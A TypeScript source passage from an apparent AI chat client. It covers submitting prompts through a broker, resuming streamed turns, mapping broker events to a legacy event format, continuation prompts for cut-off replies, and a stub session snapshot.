  // Broker is the only path now (legacy NDJSON removed). It enqueues the turn
  // and the unified WS delivers the turn events (delta/activity/done/…).
  return submitBrokerRuntimeChatPromptStream(
    requestId,
    threadId,
    sessionId,
    prompt,
    visiblePrompt,
    assistantMessageId,
    previousAssistantText,
    model,
    images,
    attachments,
    mode,
    branchFromId,
    regenerateFromUserId,
    contextOverride,
  );
}

function coreAttachmentFromInput(
  attachment: ChatAttachmentInput,
  index: number,
): CoreChatAttachment {
  return {
    artifact_id: `pending_${Date.now()}_${index}`,
    title_redacted: attachment.displayName,
    kind: attachmentKindFromMime(attachment.mimeType),
    size_bytes: attachment.sizeBytes,
    preview_available: attachment.mimeType.startsWith("image/"),
    privacy_domain: "local_files",
  };
}

function attachmentKindFromMime(mimeType: string): CoreChatAttachment["kind"] {
  if (mimeType.startsWith("image/")) return "image";
  if (mimeType.startsWith("text/") || mimeType === "application/json") return "text";
  return "file";
}

// Reattaches to an in-flight (or just-finished, within the server grace window)
// chat stream by request id: GET the resume endpoint and consume it like a fresh
// stream, persisting the reconstructed user+assistant pair on completion.
async function resumeBrowserRuntimeChatPromptStream(
  requestId: string,
  threadId: string,
  sessionId: string,
  userText: string,
  assistantMessageId: string,
  commitResult = true,
): Promise<CorePromptSubmissionResult> {
  const startedAt = performance.now();
  // Broker resume: turn_id derives from the saved requestId (`turn_{requestId}`).
  // since=0 replays all buffered turn_events for the turn; the live tail follows.
  const turnId = `turn_${requestId}`;
  const response = await openTurnStream(turnId, 0);
  if (!response.body) {
    throw new Error("The turn stream to resume has no body.");
  }
  const reader = response.body.getReader();
  const decoder = new TextDecoder();
  let buffer = "";
  let text = "";
  let redactedUserText: string | undefined;
  while (true) {
    const { done, value } = await reader.read();
    if (done) break;
    buffer += decoder.decode(value, { stream: true });
    const lines = buffer.split("\n");
    buffer = lines.pop() ?? "";
      for (const line of lines) {
        // Adapt broker {seq, kind, payload} → legacy {type, ...} and re-parse.
        if (line.includes("‹‹ACT") || line.includes("‹‹REASONING")) {
          console.log("[broker-debug] raw line with marker:", line.slice(0, 200));
        }
        const legacyEvent = parseTurnStreamEventAsLegacy(line);
        if (!legacyEvent) continue;
        const event = parseBrowserStreamEvent(JSON.stringify(legacyEvent));
        if (!event) continue;
      if (event.type === "delta") {
        text += String(event.text ?? "");
        chatApi.notifyChatStreamDelta({
          type: "delta",
          request_id: requestId,
          delta: String(event.text ?? ""),
        });
      } else if (event.type === "done") {
        chatApi.notifyChatStreamEvent({ type: "done", request_id: requestId });
        // Broker done may not carry text (server persists authoritative version).
        if (event.text) text = String(event.text);
        if (typeof event.redacted_user_text === "string") {
          redactedUserText = event.redacted_user_text;
        }
      } else if (event.type === "error") {
        chatApi.notifyChatStreamEvent({
          type: "error",
          request_id: requestId,
          message: String(event.message ?? "Local runtime error"),
        });
        throw new Error(String(event.message ?? "Local runtime error"));
      } else {
        const payload = browserStreamEventToCoreEvent(event, requestId);
        if (payload) chatApi.notifyChatStreamEvent(payload);
      }
    }
  }
  const timestamp = currentTimestampSeconds();
  const totalElapsedSeconds = roundedSeconds((performance.now() - startedAt) / 1000);
  const result: CorePromptSubmissionResult = {
    user_message: {
      id: `browser_user_${Date.now()}`,
      role: "user",
      text: redactedUserText ?? userText,
      timestamp,
      metadata: null,
      metrics: null,
    },
    assistant_message: {
      id: assistantMessageId,
      role: "assistant",
      text: text.trim(),
      timestamp,
      metadata: "Local model",
      metrics: {
        prompt_tokens: 0,
        generation_tokens: 0,
        prompt_tps: 0,
        generation_tps: 0,
        peak_memory_gb: 0,
        elapsed_seconds: totalElapsedSeconds,
        max_tokens: 0,
        prompt_build_seconds: 0,
        time_to_first_token_seconds: null,
        total_elapsed_seconds: totalElapsedSeconds,
        runtime_status_before: "desktop_gateway",
      },
    },
    computer_session: browserComputerSession(sessionId, totalElapsedSeconds),
    plan: null,
  };
  // BROKER PATH: NO client-side commit. The broker already persisted the assistant
  // message when the turn reached `done`. `commitResult` is now ignored (kept in
  // the signature for source compatibility with the caller).
  void commitResult;
  result.computer_session = await electronLocalComputerSession(sessionId);
  return result;
}

function browserChatMaxTokens(prompt: string) {
  const normalized = prompt.toLowerCase();
  const asksForCode = [
    "codice",
    "code",
    "rust",
    "typescript",
    "javascript",
    "python",
    "snippet",
    "programma",
    "function",
    "fn ",
  ].some((needle) => normalized.includes(needle));
  const asksForLongOutput =
    [
      "200 righe",
      "100 righe",
      "long code",
      "codice lungo",
      "file completo",
      "programma completo",
      "complete example",
      "esempio completo",
    ].some((needle) => normalized.includes(needle)) || prompt.length > 800;

  if (asksForCode && asksForLongOutput) return BROWSER_CHAT_LONG_CODE_MAX_TOKENS;
  if (asksForCode || asksForLongOutput) return BROWSER_CHAT_EXTENDED_MAX_TOKENS;
  return BROWSER_CHAT_DEFAULT_MAX_TOKENS;
}

function continuationPromptForMessage(previousText: string) {
  return [
    "Continue the following text exactly from the point where it was interrupted.",
    "Do not repeat already written parts. If the text is code, return only the continuation and keep the same markdown format.",
    "",
    "Text already written:",
    previousText.trim(),
  ].join("\n");
}

function joinContinuetionText(previousText: string, continuationText: string) {
  const previous = previousText.trimEnd();
  const continuation = trimRepeatedContinuetionPrefix(
    previous,
    continuationText.trimEnd(),
  );
  if (!continuation.trim()) return previous;
  if (!previous) return continuation;
  if (previous.endsWith("\n") || continuation.startsWith("\n")) {
    return `${previous}${continuation}`;
  }
  return `${previous}\n${continuation}`;
}

function trimRepeatedContinuetionPrefix(previousText: string, continuationText: string) {
  const maxOverlap = Math.min(previousText.length, continuationText.length, 4_000);
  for (let length = maxOverlap; length >= 32; length -= 1) {
    if (previousText.endsWith(continuationText.slice(0, length))) {
      return continuationText.slice(length).replace(/^\n{0,2}/, "");
    }
  }
  return continuationText;
}

function parseBrowserStreamEvent(line: string) {
  const trimmed = line.trim();
  if (!trimmed) return null;
  return JSON.parse(trimmed) as {
    type:
      | "delta"
      | "reasoning"
      | "activity"
      | "plan_update"
      | "choice_prompt"
      | "vault_propose"
      | "vault_reveal"
      | "payment_approval"
      | "tool_result"
      | "recall"
      | "done"
      | "error";
    text?: string;
    markdown?: string;
    payload?: unknown;
    redacted_user_text?: string;
    message?: string;
    metrics?: Partial<CoreChatMessageMetrics>;
  };
}

/**
 * Adapt a broker turn_event NDJSON line into the legacy `{type, ...}` shape that
 * `parseBrowserStreamEvent` + the stream loop already consume. The broker emits
 * `{seq, kind, payload}`; the legacy path expects `{type, text|markdown|payload|...}`.
 * Unknown kinds (retry, queued, aborted, cancelled) are mapped to a no-op event
 * the loop ignores (returned as null by the downstream parser).
 */
function parseTurnStreamEventAsLegacy(line: string) {
  const trimmed = line.trim();
  if (!trimmed) return null;
  const raw = JSON.parse(trimmed) as { seq?: number; kind: string; payload?: unknown };
  const payload = (raw.payload ?? {}) as Record<string, unknown>;
  switch (raw.kind) {
    case "delta":
      return { type: "delta" as const, text: String(payload.text ?? "") };
    case "reasoning":
      return { type: "reasoning" as const, text: String(payload.text ?? "") };
    case "activity":
      return { type: "activity" as const, text: String(payload.text ?? "") };
    case "plan_update":
      return { type: "plan_update" as const, markdown: String(payload.markdown ?? "") };
    case "tool":
      return { type: "tool_result" as const, payload: raw.payload };
    case "recall":
      return { type: "recall" as const, payload: raw.payload };
    case "error":
      return {
        type: "error" as const,
        message: String((payload as { message?: string }).message ?? "turn error"),
      };
    case "done":
      // The broker's done payload carries assistant_message_id + user_message_id
      // but NOT the final text (the broker persists it server-side). The loop will
      // use whatever text it accumulated from deltas; the caller refreshes from
      // the backend to get the authoritative persisted text.
      return {
        type: "done" as const,
        text: undefined,
        payload: raw.payload,
      };
    // retry / queued / aborted / cancelled: informational, no legacy mapping.
    default:
      return null;
  }
}

function browserStreamEventToCoreEvent(
  event: ReturnType<typeof parseBrowserStreamEvent>,
  requestId: string,
): CoreChatStreamEvent | null {
  if (!event) return null;
  switch (event.type) {
    case "reasoning":
      return { type: "reasoning", request_id: requestId, text: String(event.text ?? "") };
    case "activity":
      return { type: "activity", request_id: requestId, text: String(event.text ?? "") };
    case "plan_update":
      return {
        type: "plan_update",
        request_id: requestId,
        markdown: String(event.markdown ?? ""),
      };
    case "choice_prompt":
    case "vault_propose":
    case "vault_reveal":
    case "payment_approval":
    case "tool_result":
    case "recall":
      return {
        type: event.type,
        request_id: requestId,
        payload: event.payload,
      } as CoreChatStreamEvent;
    default:
      return null;
  }
}

function browserComputerSession(
  sessionId: string,
  elapsedSeconds: number,
): CoreComputerSessionSnapshot {
  return {
    computer_session_id: sessionId,
    task_id: "browser_preview_chat",
    workflow_id: null,
    user_id: "browser-preview",
    workspace_id: "local-workspace",
    status: "running",
    active_surface: "logs",
    surfaces: [
      {
        surface: "logs",
        label: "Local chat",
        status: "running",
        detail_redacted: "Chat via the inference provider",
      },
    ],
    activity_title: "Local chat",
    activity_subtitle: "Inference via the configured provider",
    progress_current: 1,
    progress_total: 1,
    elapsed_seconds: elapsedSeconds,
    preview_frame_ref: null,
    current_url_redacted: null,
    terminal_excerpt_redacted: ["Chat connected to the inference provider."],
    artifact_refs: [],
    timeline: [],
    approval_state: "not_required",
    takeover_state: "not_requested",
    risk_level: "low",
    last_error_redacted: null,
    updated_at: currentTimestampSeconds(),
  };
}

function currentTimestampSeconds() {
  return Math.floor(Date.now() / 1000).toString();
}

function roundedSeconds(value: number) {
  return Math.round(value * 1000) / 1000;
}
